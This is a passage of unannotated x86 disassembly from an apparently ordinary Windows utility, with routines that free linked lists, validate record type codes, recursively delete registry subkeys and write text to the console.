  405ee7:	call   DWORD PTR ds:0x409170
  405eed:	add    esp,0xc
  405ef0:	test   eax,eax
  405ef2:	jne    0x405f5d
  405ef4:	inc    DWORD PTR [ebp-0xc]
  405ef7:	mov    ecx,esi
  405ef9:	xor    ebx,ebx
  405efb:	call   0x404261
  405f00:	test   al,al
  405f02:	jne    0x405f27
  405f04:	push   0x1
  405f06:	push   0x78
  405f08:	jmp    0x405f51
  405f0a:	mov    ecx,esi
  405f0c:	inc    ebx
  405f0d:	call   0x405acb
  405f12:	mov    edi,eax
  405f14:	test   edi,edi
  405f16:	jne    0x40608d
  405f1c:	mov    ecx,esi
  405f1e:	call   0x404155
  405f23:	test   al,al
  405f25:	je     0x405f39
  405f27:	push   ecx
  405f28:	push   ecx
  405f29:	mov    edx,0x401178
  405f2e:	mov    ecx,esi
  405f30:	call   0x404202
  405f35:	test   al,al
  405f37:	jne    0x405f0a
  405f39:	mov    ecx,esi
  405f3b:	call   0x404312
  405f40:	test   ebx,ebx
  405f42:	je     0x405f04
  405f44:	cmp    ebx,0x1
  405f47:	jbe    0x406026
  405f4d:	push   0x1
  405f4f:	push   0x7d
  405f51:	call   0x4068f5
  405f56:	pop    ecx
  405f57:	pop    ecx
  405f58:	jmp    0x406026
  405f5d:	fld    QWORD PTR ds:0x402e50
  405f63:	fcomp  QWORD PTR ds:0x4083c0
  405f69:	fnstsw ax
  405f6b:	test   ah,0x41
  405f6e:	jne    0x406026
  405f74:	push   DWORD PTR [ebp-0x4]
  405f77:	push   0x401210
  405f7c:	push   ebx
  405f7d:	call   DWORD PTR ds:0x409170
  405f83:	add    esp,0xc
  405f86:	test   eax,eax
  405f88:	jne    0x406026
  405f8e:	mov    ecx,esi
  405f90:	call   0x404261
  405f95:	test   al,al
  405f97:	je     0x406026
  405f9d:	push   ecx
  405f9e:	push   ecx
  405f9f:	mov    edx,0x40122c
  405fa4:	mov    ecx,esi
  405fa6:	call   0x404202
  405fab:	test   al,al
  405fad:	je     0x40601f
  405faf:	lea    eax,[ebp-0x4]
  405fb2:	mov    edx,0x401464
  405fb7:	push   eax
  405fb8:	mov    ecx,esi
  405fba:	call   0x403fdc
  405fbf:	mov    ecx,esi
  405fc1:	call   0x404261
  405fc6:	test   al,al
  405fc8:	je     0x40601f
  405fca:	push   ecx
  405fcb:	push   ecx
  405fcc:	mov    edx,0x401240
  405fd1:	mov    ecx,esi
  405fd3:	call   0x404202
  405fd8:	test   al,al
  405fda:	je     0x406018
  405fdc:	mov    ecx,esi
  405fde:	call   0x404261
  405fe3:	test   al,al
  405fe5:	je     0x406018
  405fe7:	mov    ebx,0x401258
  405fec:	jmp    0x406002
  405fee:	mov    ecx,esi
  405ff0:	call   0x404d16
  405ff5:	mov    ecx,esi
  405ff7:	mov    edi,eax
  405ff9:	call   0x404155
  405ffe:	test   al,al
  406000:	je     0x406011
  406002:	push   ecx
  406003:	push   ecx
  406004:	mov    edx,ebx
  406006:	mov    ecx,esi
  406008:	call   0x404202
  40600d:	test   al,al
  40600f:	jne    0x405fee
  406011:	mov    ecx,esi
  406013:	call   0x404312
  406018:	mov    ecx,esi
  40601a:	call   0x404312
  40601f:	mov    ecx,esi
  406021:	call   0x404312
  406026:	mov    ecx,esi
  406028:	call   0x404155
  40602d:	test   al,al
  40602f:	je     0x406044
  406031:	push   ecx
  406032:	push   ecx
  406033:	xor    edx,edx
  406035:	mov    ecx,esi
  406037:	call   0x404202
  40603c:	test   al,al
  40603e:	jne    0x405eca
  406044:	mov    ecx,esi
  406046:	call   0x404312
  40604b:	mov    ecx,esi
  40604d:	call   0x404155
  406052:	test   al,al
  406054:	je     0x406069
  406056:	push   ecx
  406057:	push   ecx
  406058:	xor    edx,edx
  40605a:	mov    ecx,esi
  40605c:	call   0x404202
  406061:	test   al,al
  406063:	jne    0x405e34
  406069:	mov    ebx,DWORD PTR [ebp-0xc]
  40606c:	test   ebx,ebx
  40606e:	je     0x40607b
  406070:	cmp    ebx,0x1
  406073:	jbe    0x406086
  406075:	push   0x1
  406077:	push   0x7c
  406079:	jmp    0x40607f
  40607b:	push   0x1
  40607d:	push   0x77
  40607f:	call   0x4068f5
  406084:	pop    ecx
  406085:	pop    ecx
  406086:	mov    ecx,esi
  406088:	call   0x404312
  40608d:	mov    ecx,esi
  40608f:	call   0x403d06
  406094:	push   esi
  406095:	push   0x0
  406097:	call   DWORD PTR ds:0x409050
  40609d:	push   eax
  40609e:	call   DWORD PTR ds:0x409054
  4060a4:	test   edi,edi
  4060a6:	je     0x4060ad
  4060a8:	call   0x4060bb
  4060ad:	mov    eax,edi
  4060af:	pop    edi
  4060b0:	pop    esi
  4060b1:	pop    ebx
  4060b2:	mov    esp,ebp
  4060b4:	pop    ebp
  4060b5:	ret    
  4060b6:	int3   
  4060b7:	int3   
  4060b8:	int3   
  4060b9:	int3   
  4060ba:	int3   
  4060bb:	mov    edi,edi
  4060bd:	push   ebp
  4060be:	mov    ebp,esp
  4060c0:	sub    esp,0x18
  4060c3:	push   ebx
  4060c4:	push   esi
  4060c5:	push   edi
  4060c6:	call   DWORD PTR ds:0x409050
  4060cc:	mov    ebx,DWORD PTR ds:0x4083a8
  4060d2:	mov    edi,eax
  4060d4:	mov    eax,ds:0x4083b0
  4060d9:	mov    DWORD PTR [ebp-0x4],edi
  4060dc:	mov    DWORD PTR [ebp-0x8],ebx
  4060df:	mov    DWORD PTR [ebp-0x18],eax
  4060e2:	test   ebx,ebx
  4060e4:	je     0x4061eb
  4060ea:	mov    esi,DWORD PTR [ebx+0x4]
  4060ed:	mov    eax,DWORD PTR [ebx]
  4060ef:	mov    DWORD PTR [ebp-0x14],eax
  4060f2:	test   esi,esi
  4060f4:	je     0x4061ce
  4060fa:	mov    ebx,DWORD PTR [ebp-0x4]
  4060fd:	mov    edi,DWORD PTR [esi+0x4]
  406100:	mov    eax,DWORD PTR [esi]
  406102:	mov    DWORD PTR [ebp-0x10],eax
  406105:	test   edi,edi
  406107:	je     0x406169
  406109:	cmp    DWORD PTR [edi+0x44],0x0
  40610d:	mov    eax,DWORD PTR [edi]
  40610f:	mov    DWORD PTR [ebp-0xc],eax
  406112:	je     0x406126
  406114:	push   DWORD PTR [edi+0x44]
  406117:	push   0x0
  406119:	call   DWORD PTR ds:0x409050
  40611f:	push   eax
  406120:	call   DWORD PTR ds:0x409054
  406126:	cmp    DWORD PTR [edi+0x48],0x0
  40612a:	je     0x40613e
  40612c:	push   DWORD PTR [edi+0x48]
  40612f:	push   0x0
  406131:	call   DWORD PTR ds:0x409050
  406137:	push   eax
  406138:	call   DWORD PTR ds:0x409054
  40613e:	cmp    DWORD PTR [edi+0x4c],0x0
  406142:	je     0x406156
  406144:	push   DWORD PTR [edi+0x4c]
  406147:	push   0x0
  406149:	call   DWORD PTR ds:0x409050
  40614f:	push   eax
  406150:	call   DWORD PTR ds:0x409054
  406156:	push   edi
  406157:	push   0x0
  406159:	push   ebx
  40615a:	call   DWORD PTR ds:0x409054
  406160:	mov    eax,DWORD PTR [ebp-0xc]
  406163:	mov    edi,eax
  406165:	test   eax,eax
  406167:	jne    0x406109
  406169:	cmp    DWORD PTR [esi+0x2c],0x0
  40616d:	je     0x406181
  40616f:	push   DWORD PTR [esi+0x2c]
  406172:	push   0x0
  406174:	call   DWORD PTR ds:0x409050
  40617a:	push   eax
  40617b:	call   DWORD PTR ds:0x409054
  406181:	cmp    DWORD PTR [esi+0x30],0x0
  406185:	je     0x406199
  406187:	push   DWORD PTR [esi+0x30]
  40618a:	push   0x0
  40618c:	call   DWORD PTR ds:0x409050
  406192:	push   eax
  406193:	call   DWORD PTR ds:0x409054
  406199:	cmp    DWORD PTR [esi+0x34],0x0
  40619d:	je     0x4061b1
  40619f:	push   DWORD PTR [esi+0x34]
  4061a2:	push   0x0
  4061a4:	call   DWORD PTR ds:0x409050
  4061aa:	push   eax
  4061ab:	call   DWORD PTR ds:0x409054
  4061b1:	push   esi
  4061b2:	push   0x0
  4061b4:	push   ebx
  4061b5:	call   DWORD PTR ds:0x409054
  4061bb:	mov    eax,DWORD PTR [ebp-0x10]
  4061be:	mov    esi,eax
  4061c0:	test   eax,eax
  4061c2:	jne    0x4060fd
  4061c8:	mov    ebx,DWORD PTR [ebp-0x8]
  4061cb:	mov    edi,DWORD PTR [ebp-0x4]
  4061ce:	push   ebx
  4061cf:	push   0x0
  4061d1:	push   edi
  4061d2:	call   DWORD PTR ds:0x409054
  4061d8:	mov    eax,DWORD PTR [ebp-0x14]
  4061db:	mov    ebx,eax
  4061dd:	mov    DWORD PTR [ebp-0x8],ebx
  4061e0:	test   eax,eax
  4061e2:	jne    0x4060ea
  4061e8:	mov    eax,DWORD PTR [ebp-0x18]
  4061eb:	xor    ebx,ebx
  4061ed:	test   eax,eax
  4061ef:	je     0x406202
  4061f1:	mov    esi,DWORD PTR [eax]
  4061f3:	push   eax
  4061f4:	push   ebx
  4061f5:	push   edi
  4061f6:	call   DWORD PTR ds:0x409054
  4061fc:	mov    eax,esi
  4061fe:	test   esi,esi
  406200:	jne    0x4061f1
  406202:	mov    eax,ds:0x4083b4
  406207:	test   eax,eax
  406209:	je     0x406214
  40620b:	push   eax
  40620c:	push   ebx
  40620d:	push   edi
  40620e:	call   DWORD PTR ds:0x409054
  406214:	fldz   
  406216:	xor    eax,eax
  406218:	pop    edi
  406219:	inc    eax
  40621a:	mov    DWORD PTR ds:0x4083a8,ebx
  406220:	pop    esi
  406221:	mov    DWORD PTR ds:0x4083b0,ebx
  406227:	mov    DWORD PTR ds:0x4083b4,ebx
  40622d:	mov    DWORD PTR ds:0x4083ac,ebx
  406233:	mov    DWORD PTR ds:0x4083b8,ebx
  406239:	mov    BYTE PTR ds:0x4083bc,bl
  40623f:	fstp   QWORD PTR ds:0x4083c0
  406245:	mov    ds:0x40804c,eax
  40624a:	mov    ds:0x408048,eax
  40624f:	pop    ebx
  406250:	mov    esp,ebp
  406252:	pop    ebp
  406253:	ret    
  406254:	int3   
  406255:	int3   
  406256:	int3   
  406257:	int3   
  406258:	int3   
  406259:	xor    eax,eax
  40625b:	cmp    edx,0xffffffff
  40625e:	je     0x406270
  406260:	mov    eax,DWORD PTR [ecx+0x4]
  406263:	jmp    0x40626c
  406265:	cmp    DWORD PTR [eax+0x20],edx
  406268:	je     0x406270
  40626a:	mov    eax,DWORD PTR [eax]
  40626c:	test   eax,eax
  40626e:	jne    0x406265
  406270:	ret    
  406271:	int3   
  406272:	int3   
  406273:	int3   
  406274:	int3   
  406275:	int3   
  406276:	mov    edi,edi
  406278:	push   ebp
  406279:	mov    ebp,esp
  40627b:	sub    esp,0xc
  40627e:	mov    eax,ds:0x4083a8
  406283:	mov    ecx,eax
  406285:	push   ebx
  406286:	push   esi
  406287:	push   edi
  406288:	xor    edi,edi
  40628a:	mov    DWORD PTR [ebp-0x8],eax
  40628d:	test   ecx,ecx
  40628f:	je     0x4062cb
  406291:	mov    ebx,DWORD PTR [ecx]
  406293:	mov    edx,ebx
  406295:	jmp    0x4062be
  406297:	mov    esi,edi
  406299:	mov    eax,DWORD PTR [ecx+esi*4+0x8]
  40629d:	cmp    eax,DWORD PTR [edx+esi*4+0x8]
  4062a1:	jne    0x4062bc
  4062a3:	inc    esi
  4062a4:	cmp    esi,0x4
  4062a7:	jne    0x406299
  4062a9:	push   0xd
  4062ab:	pop    edi
  4062ac:	push   0x2
  4062ae:	push   0x73
  4062b0:	call   0x4068f5
  4062b5:	pop    ecx
  4062b6:	pop    ecx
  4062b7:	jmp    0x406694
  4062bc:	mov    edx,DWORD PTR [edx]
  4062be:	test   edx,edx
  4062c0:	jne    0x406297
  4062c2:	mov    ecx,ebx
  4062c4:	test   ecx,ecx
  4062c6:	jne    0x406291
  4062c8:	mov    eax,DWORD PTR [ebp-0x8]
  4062cb:	mov    ecx,eax
  4062cd:	test   ecx,ecx
  4062cf:	je     0x406342
  4062d1:	mov    edx,DWORD PTR [ecx+0x4]
  4062d4:	jmp    0x406335
  4062d6:	mov    esi,DWORD PTR [edx]
  4062d8:	jmp    0x4062f7
  4062da:	mov    ebx,edi
  4062dc:	mov    eax,DWORD PTR [edx+ebx*4+0x8]
  4062e0:	cmp    eax,DWORD PTR [esi+ebx*4+0x8]
  4062e4:	jne    0x4062f5
  4062e6:	inc    ebx
  4062e7:	cmp    ebx,0x4
  4062ea:	jne    0x4062dc
  4062ec:	push   0xd
  4062ee:	pop    edi
  4062ef:	push   0x2
  4062f1:	push   0x74
  4062f3:	jmp    0x4062b0
  4062f5:	mov    esi,DWORD PTR [esi]
  4062f7:	test   esi,esi
  4062f9:	jne    0x4062da
  4062fb:	mov    esi,DWORD PTR [ecx]
  4062fd:	jmp    0x40632f
  4062ff:	mov    ebx,DWORD PTR [esi+0x4]
  406302:	jmp    0x406329
  406304:	mov    eax,edi
  406306:	mov    DWORD PTR [ebp-0x4],edi
  406309:	mov    edi,DWORD PTR [ebp-0x4]
  40630c:	mov    eax,DWORD PTR [edx+eax*4+0x8]
  406310:	push   0x0
  406312:	cmp    eax,DWORD PTR [ebx+edi*4+0x8]
  406316:	pop    edi
  406317:	jne    0x406327
  406319:	mov    eax,DWORD PTR [ebp-0x4]
  40631c:	inc    eax
  40631d:	mov    DWORD PTR [ebp-0x4],eax
  406320:	cmp    eax,0x4
  406323:	jne    0x406309
  406325:	jmp    0x4062ec
  406327:	mov    ebx,DWORD PTR [ebx]
  406329:	test   ebx,ebx
  40632b:	jne    0x406304
  40632d:	mov    esi,DWORD PTR [esi]
  40632f:	test   esi,esi
  406331:	jne    0x4062ff
  406333:	mov    edx,DWORD PTR [edx]
  406335:	test   edx,edx
  406337:	jne    0x4062d6
  406339:	mov    ecx,DWORD PTR [ecx]
  40633b:	test   ecx,ecx
  40633d:	jne    0x4062d1
  40633f:	mov    eax,DWORD PTR [ebp-0x8]
  406342:	test   eax,eax
  406344:	je     0x406694
  40634a:	mov    ecx,DWORD PTR [eax+0x4]
  40634d:	mov    DWORD PTR [ebp-0x4],ecx
  406350:	test   edi,edi
  406352:	jne    0x406687
  406358:	test   ecx,ecx
  40635a:	je     0x406684
  406360:	mov    esi,DWORD PTR [ecx+0x4]
  406363:	jmp    0x40666f
  406368:	test   esi,esi
  40636a:	je     0x406677
  406370:	mov    ebx,DWORD PTR [esi+0x8]
  406373:	mov    eax,DWORD PTR [ebx+0x8]
  406376:	cmp    eax,0x20c20400
  40637b:	ja     0x4064a6
  406381:	je     0x406470
  406387:	cmp    eax,0x650500
  40638c:	je     0x4063c0
  40638e:	cmp    eax,0x20020400
  406393:	je     0x40643e
  406399:	cmp    eax,0x20020500
  40639e:	je     0x4063e5
  4063a0:	cmp    eax,0x20470500
  4063a5:	je     0x4063e5
  4063a7:	cmp    eax,0x20570500
  4063ac:	je     0x4063e5
  4063ae:	cmp    eax,0x20610500
  4063b3:	je     0x4063c0
  4063b5:	cmp    eax,0x20670500
  4063ba:	jne    0x4064f3
  4063c0:	or     DWORD PTR [esi+0x34],0xffffffff
  4063c4:	or     DWORD PTR [esi+0x40],0xffffffff
  4063c8:	mov    edx,DWORD PTR [esi+0x38]
  4063cb:	call   0x406259
  4063d0:	test   eax,eax
  4063d2:	jne    0x406525
  4063d8:	push   DWORD PTR [ebx+0x4]
  4063db:	push   DWORD PTR [esi+0x20]
  4063de:	push   0x401414
  4063e3:	jmp    0x406408
  4063e5:	or     DWORD PTR [esi+0x38],0xffffffff
  4063e9:	or     DWORD PTR [esi+0x3c],0xffffffff
  4063ed:	or     DWORD PTR [esi+0x40],0xffffffff
  4063f1:	mov    edx,DWORD PTR [esi+0x34]
  4063f4:	call   0x406259
  4063f9:	test   eax,eax
  4063fb:	jne    0x406419
  4063fd:	push   DWORD PTR [ebx+0x4]
  406400:	push   DWORD PTR [esi+0x20]
  406403:	push   0x4013bc
  406408:	push   0x2
  40640a:	push   0x75
  40640c:	call   0x4068f5
  406411:	add    esp,0x14
  406414:	jmp    0x406667
  406419:	mov    eax,DWORD PTR [eax+0x8]
  40641c:	cmp    DWORD PTR [eax+0x8],0x40030500
  406423:	je     0x40666d
  406429:	push   DWORD PTR [eax+0x4]
  40642c:	push   0x4026d8
  406431:	push   DWORD PTR [esi+0x20]
  406434:	push   0x4013bc
  406439:	jmp    0x40665b
  40643e:	or     DWORD PTR [esi+0x38],0xffffffff
  406442:	or     DWORD PTR [esi+0x3c],0xffffffff
  406446:	or     DWORD PTR [esi+0x40],0xffffffff
  40644a:	mov    edx,DWORD PTR [esi+0x34]
  40644d:	call   0x406259
  406452:	test   eax,eax
  406454:	je     0x4063fd
  406456:	mov    eax,DWORD PTR [eax+0x8]
  406459:	cmp    DWORD PTR [eax+0x8],0x40030403
  406460:	je     0x40666d
  406466:	push   DWORD PTR [eax+0x4]
  406469:	push   0x402694
  40646e:	jmp    0x406431
  406470:	or     DWORD PTR [esi+0x38],0xffffffff
  406474:	or     DWORD PTR [esi+0x3c],0xffffffff
  406478:	or     DWORD PTR [esi+0x40],0xffffffff
  40647c:	mov    edx,DWORD PTR [esi+0x34]
  40647f:	call   0x406259
  406484:	test   eax,eax
  406486:	je     0x4063fd
  40648c:	mov    eax,DWORD PTR [eax+0x8]
  40648f:	cmp    DWORD PTR [eax+0x8],0x40030401
  406496:	je     0x40666d
  40649c:	push   DWORD PTR [eax+0x4]
  40649f:	push   0x4021ac
  4064a4:	jmp    0x406431
  4064a6:	cmp    eax,0x22410500
  4064ab:	je     0x406622
  4064b1:	cmp    eax,0x22510500
  4064b6:	je     0x406622
  4064bc:	cmp    eax,0x23410500
  4064c1:	je     0x4065a8
  4064c7:	cmp    eax,0x23510500
  4064cc:	je     0x406622
  4064d2:	cmp    eax,0x30020400
  4064d7:	je     0x406587
  4064dd:	cmp    eax,0x30240500
  4064e2:	je     0x4063c0
  4064e8:	cmp    eax,0x40020500
  4064ed:	je     0x406587
  4064f3:	or     DWORD PTR [esi+0x34],0xffffffff
  4064f7:	or     DWORD PTR [esi+0x38],0xffffffff
  4064fb:	or     DWORD PTR [esi+0x3c],0xffffffff
  4064ff:	or     DWORD PTR [esi+0x40],0xffffffff
  406503:	jmp    0x40666d
  406508:	mov    eax,DWORD PTR [eax+0x8]
  40650b:	cmp    DWORD PTR [eax+0x8],0x40030402
  406512:	je     0x40666d
  406518:	push   DWORD PTR [eax+0x4]
  40651b:	push   0x402244
  406520:	jmp    0x406431
  406525:	mov    eax,DWORD PTR [eax+0x8]
  406528:	cmp    DWORD PTR [eax+0x8],0x10100
  40652f:	je     0x406546
  406531:	push   DWORD PTR [eax+0x4]
  406534:	push   0x401f60
  406539:	push   DWORD PTR [esi+0x20]
  40653c:	push   0x401414
  406541:	jmp    0x40665b
  406546:	mov    edx,DWORD PTR [esi+0x3c]
  406549:	call   0x406259
  40654e:	test   eax,eax
  406550:	jne    0x406562
  406552:	push   DWORD PTR [ebx+0x4]
  406555:	push   DWORD PTR [esi+0x20]
  406558:	push   0x40142c
  40655d:	jmp    0x406408
  406562:	mov    eax,DWORD PTR [eax+0x8]
  406565:	cmp    DWORD PTR [eax+0x8],0x10100
  40656c:	je     0x40666d
  406572:	push   DWORD PTR [eax+0x4]
  406575:	push   0x401f60
  40657a:	push   DWORD PTR [esi+0x20]
  40657d:	push   0x40142c
  406582:	jmp    0x40665b
  406587:	or     DWORD PTR [esi+0x38],0xffffffff
  40658b:	or     DWORD PTR [esi+0x3c],0xffffffff
  40658f:	or     DWORD PTR [esi+0x40],0xffffffff
  406593:	mov    edx,DWORD PTR [esi+0x34]
  406596:	call   0x406259
  40659b:	test   eax,eax
  40659d:	jne    0x406508
  4065a3:	jmp    0x4063fd
  4065a8:	or     DWORD PTR [esi+0x38],0xffffffff
  4065ac:	or     DWORD PTR [esi+0x3c],0xffffffff
  4065b0:	mov    edx,DWORD PTR [esi+0x34]
  4065b3:	call   0x406259
  4065b8:	test   eax,eax
  4065ba:	jne    0x4065d5
  4065bc:	push   DWORD PTR [ebx+0x4]
  4065bf:	push   DWORD PTR [esi+0x20]
  4065c2:	push   0x4013bc
  4065c7:	push   0x2
  4065c9:	push   0x75
  4065cb:	call   0x4068f5
  4065d0:	add    esp,0x14
  4065d3:	jmp    0x4065fd
  4065d5:	mov    eax,DWORD PTR [eax+0x8]
  4065d8:	cmp    DWORD PTR [eax+0x8],0x42030500
  4065df:	je     0x406603
  4065e1:	push   DWORD PTR [eax+0x4]
  4065e4:	push   0x4024c0
  4065e9:	push   DWORD PTR [esi+0x20]
  4065ec:	push   0x4013bc
  4065f1:	push   0x2
  4065f3:	push   0x76
  4065f5:	call   0x4068f5
  4065fa:	add    esp,0x18
  4065fd:	mov    ecx,DWORD PTR [ebp-0x4]
  406600:	push   0xd
  406602:	pop    edi
  406603:	mov    edx,DWORD PTR [esi+0x40]
  406606:	call   0x406259
  40660b:	test   eax,eax
  40660d:	jne    0x40663f
  40660f:	mov    eax,DWORD PTR [esi+0x8]
  406612:	push   DWORD PTR [eax+0x4]
  406615:	push   DWORD PTR [esi+0x20]
  406618:	push   0x401444
  40661d:	jmp    0x406408
  406622:	or     DWORD PTR [esi+0x34],0xffffffff
  406626:	or     DWORD PTR [esi+0x38],0xffffffff
  40662a:	or     DWORD PTR [esi+0x3c],0xffffffff
  40662e:	mov    edx,DWORD PTR [esi+0x40]
  406631:	call   0x406259
  406636:	test   eax,eax
  406638:	jne    0x40663f
  40663a:	push   DWORD PTR [ebx+0x4]
  40663d:	jmp    0x406615
  40663f:	mov    eax,DWORD PTR [eax+0x8]
  406642:	cmp    DWORD PTR [eax+0x8],0x10000
  406649:	je     0x40666d
  40664b:	push   DWORD PTR [eax+0x4]
  40664e:	push   0x401efc
  406653:	push   DWORD PTR [esi+0x20]
  406656:	push   0x401444
  40665b:	push   0x2
  40665d:	push   0x76
  40665f:	call   0x4068f5
  406664:	add    esp,0x18
  406667:	mov    ecx,DWORD PTR [ebp-0x4]
  40666a:	push   0xd
  40666c:	pop    edi
  40666d:	mov    esi,DWORD PTR [esi]
  40666f:	test   edi,edi
  406671:	je     0x406368
  406677:	mov    ecx,DWORD PTR [ecx]
  406679:	mov    DWORD PTR [ebp-0x4],ecx
  40667c:	test   edi,edi
  40667e:	je     0x406358
  406684:	mov    eax,DWORD PTR [ebp-0x8]
  406687:	mov    eax,DWORD PTR [eax]
  406689:	mov    DWORD PTR [ebp-0x8],eax
  40668c:	test   edi,edi
  40668e:	je     0x406342
  406694:	mov    eax,edi
  406696:	pop    edi
  406697:	pop    esi
  406698:	pop    ebx
  406699:	mov    esp,ebp
  40669b:	pop    ebp
  40669c:	ret    
  40669d:	int3   
  40669e:	int3   
  40669f:	int3   
  4066a0:	int3   
  4066a1:	int3   
  4066a2:	mov    edi,edi
  4066a4:	push   ebp
  4066a5:	mov    ebp,esp
  4066a7:	sub    esp,0x218
  4066ad:	mov    eax,ds:0x408004
  4066b2:	xor    eax,ebp
  4066b4:	mov    DWORD PTR [ebp-0x4],eax
  4066b7:	push   ebx
  4066b8:	push   esi
  4066b9:	push   edi
  4066ba:	lea    eax,[ebp-0x214]
  4066c0:	xor    ebx,ebx
  4066c2:	push   eax
  4066c3:	push   0x2000000
  4066c8:	push   ebx
  4066c9:	mov    edi,edx
  4066cb:	mov    esi,ecx
  4066cd:	push   edi
  4066ce:	push   esi
  4066cf:	call   DWORD PTR ds:0x4090bc
  4066d5:	test   eax,eax
  4066d7:	jne    0x406764
  4066dd:	push   ebx
  4066de:	push   ebx
  4066df:	push   ebx
  4066e0:	push   ebx
  4066e1:	push   ebx
  4066e2:	push   ebx
  4066e3:	push   ebx
  4066e4:	lea    eax,[ebp-0x218]
  4066ea:	push   eax
  4066eb:	push   ebx
  4066ec:	push   ebx
  4066ed:	push   ebx
  4066ee:	push   DWORD PTR [ebp-0x214]
  4066f4:	call   DWORD PTR ds:0x4090b0
  4066fa:	jmp    0x40670d
  4066fc:	mov    ecx,DWORD PTR [ebp-0x214]
  406702:	lea    edx,[ebp-0x210]
  406708:	call   0x4066a2
  40670d:	test   eax,eax
  40670f:	jne    0x406750
  406711:	push   0x20a
  406716:	lea    eax,[ebp-0x210]
  40671c:	push   ebx
  40671d:	push   eax
  40671e:	call   0x407768
  406723:	mov    eax,DWORD PTR [ebp-0x218]
  406729:	lea    ecx,[ebp-0x210]
  40672f:	add    esp,0xc
  406732:	dec    eax
  406733:	mov    DWORD PTR [ebp-0x218],eax
  406739:	push   0x105
  40673e:	push   ecx
  40673f:	push   eax
  406740:	push   DWORD PTR [ebp-0x214]
  406746:	call   DWORD PTR ds:0x4090cc
  40674c:	test   eax,eax
  40674e:	je     0x4066fc
  406750:	push   DWORD PTR [ebp-0x214]
  406756:	call   DWORD PTR ds:0x4090b4
  40675c:	push   edi
  40675d:	push   esi
  40675e:	call   DWORD PTR ds:0x4090c8
  406764:	mov    ecx,DWORD PTR [ebp-0x4]
  406767:	pop    edi
  406768:	pop    esi
  406769:	xor    ecx,ebp
  40676b:	pop    ebx
  40676c:	call   0x407090
  406771:	mov    esp,ebp
  406773:	pop    ebp
  406774:	ret    
  406775:	int3   
  406776:	int3   
  406777:	int3   
  406778:	int3   
  406779:	int3   
  40677a:	mov    edi,edi
  40677c:	push   ebx
  40677d:	mov    ebx,ecx
  40677f:	xor    edx,edx
  406781:	push   esi
  406782:	xor    esi,esi
  406784:	push   edi
  406785:	movzx  ecx,WORD PTR [ebx]
  406788:	mov    eax,esi
  40678a:	mov    edi,esi
  40678c:	cmp    dx,cx
  40678f:	je     0x4067f8
  406791:	push   0xa
  406793:	pop    esi
  406794:	cmp    si,cx
  406797:	jne    0x40679a
  406799:	inc    eax
  40679a:	inc    edi
  40679b:	xor    edx,edx
  40679d:	inc    eax
  40679e:	movzx  ecx,WORD PTR [ebx+edi*2]
  4067a2:	cmp    dx,cx
  4067a5:	jne    0x406794
  4067a7:	push   edx
  4067a8:	pop    esi
  4067a9:	cmp    eax,edi
  4067ab:	je     0x4067f8
  4067ad:	lea    eax,[eax*2+0x2]
  4067b4:	push   eax
  4067b5:	push   esi
  4067b6:	call   DWORD PTR ds:0x409050
  4067bc:	push   eax
  4067bd:	call   DWORD PTR ds:0x409048
  4067c3:	mov    ecx,eax
  4067c5:	test   ecx,ecx
  4067c7:	je     0x4067fa
  4067c9:	mov    edx,esi
  4067cb:	test   edi,edi
  4067cd:	je     0x4067ee
  4067cf:	push   0xa
  4067d1:	pop    eax
  4067d2:	cmp    ax,WORD PTR [ebx+edx*2]
  4067d6:	jne    0x4067e0
  4067d8:	push   0xd
  4067da:	pop    eax
  4067db:	mov    WORD PTR [ecx+esi*2],ax
  4067df:	inc    esi
  4067e0:	mov    ax,WORD PTR [ebx+edx*2]
  4067e4:	inc    edx
  4067e5:	mov    WORD PTR [ecx+esi*2],ax
  4067e9:	inc    esi
  4067ea:	cmp    edx,edi
  4067ec:	jb     0x4067cf
  4067ee:	xor    eax,eax
  4067f0:	mov    WORD PTR [ecx+esi*2],ax
  4067f4:	mov    eax,ecx
  4067f6:	jmp    0x4067fa
  4067f8:	mov    eax,ebx
  4067fa:	pop    edi
  4067fb:	pop    esi
  4067fc:	pop    ebx
  4067fd:	ret    
  4067fe:	int3   
  4067ff:	int3   
  406800:	int3   
  406801:	int3   
  406802:	int3   
  406803:	mov    edi,edi
  406805:	push   ebp
  406806:	mov    ebp,esp
  406808:	sub    esp,0x10
  40680b:	push   ebx
  40680c:	push   esi
  40680d:	push   edi
  40680e:	push   0xfffffff5
  406810:	mov    ebx,ecx
  406812:	call   DWORD PTR ds:0x40908c
  406818:	mov    edi,eax
  40681a:	mov    DWORD PTR [ebp-0x10],edi
  40681d:	cmp    edi,0xffffffff
  406820:	je     0x40685c
  406822:	push   edi
  406823:	call   DWORD PTR ds:0x409028
  406829:	and    eax,0xffff7fff
  40682e:	cmp    eax,0x2
  406831:	jne    0x40685c
  406833:	mov    ecx,ebx
  406835:	xor    esi,esi
  406837:	lea    edx,[ecx+0x2]
  40683a:	mov    ax,WORD PTR [ecx]
  40683d:	add    ecx,0x2
  406840:	cmp    ax,si
  406843:	jne    0x40683a
  406845:	push   esi
  406846:	sub    ecx,edx
  406848:	lea    eax,[ebp-0xc]
  40684b:	push   eax
  40684c:	sar    ecx,1
  40684e:	push   ecx
  40684f:	push   ebx
  406850:	push   edi
  406851:	call   DWORD PTR ds:0x409008
  406857:	jmp    0x4068e9
  40685c:	mov    ecx,ebx
  40685e:	call   0x40677a
  406863:	mov    edi,eax
  406865:	xor    esi,esi
  406867:	test   edi,edi
  406869:	je     0x4068d2
  40686b:	push   esi
  40686c:	push   esi
  40686d:	push   esi
  40686e:	push   esi
  40686f:	push   0xffffffff
  406871:	push   edi
  406872:	push   esi
  406873:	push   0x1
  406875:	call   DWORD PTR ds:0x4090d8
  40687b:	mov    DWORD PTR [ebp-0x8],eax
  40687e:	test   eax,eax
  406880:	je     0x4068d2
  406882:	push   eax
  406883:	push   esi
  406884:	call   DWORD PTR ds:0x409050
  40688a:	push   eax
  40688b:	call   DWORD PTR ds:0x409048
  406891:	mov    DWORD PTR [ebp-0x4],eax
  406894:	test   eax,eax
  406896:	je     0x4068d2
  406898:	push   esi
  406899:	push   esi
  40689a:	push   DWORD PTR [ebp-0x8]
  40689d:	push   eax
  40689e:	push   0xffffffff
  4068a0:	push   edi
  4068a1:	push   esi
  4068a2:	push   0x1
  4068a4:	call   DWORD PTR ds:0x4090d8
  4068aa:	test   eax,eax
  4068ac:	je     0x4068c1
  4068ae:	push   esi
  4068af:	lea    ecx,[ebp-0xc]
  4068b2:	dec    eax
  4068b3:	push   ecx
  4068b4:	push   eax
  4068b5:	push   DWORD PTR [ebp-0x4]
  4068b8:	push   DWORD PTR [ebp-0x10]
  4068bb:	call   DWORD PTR ds:0x409030
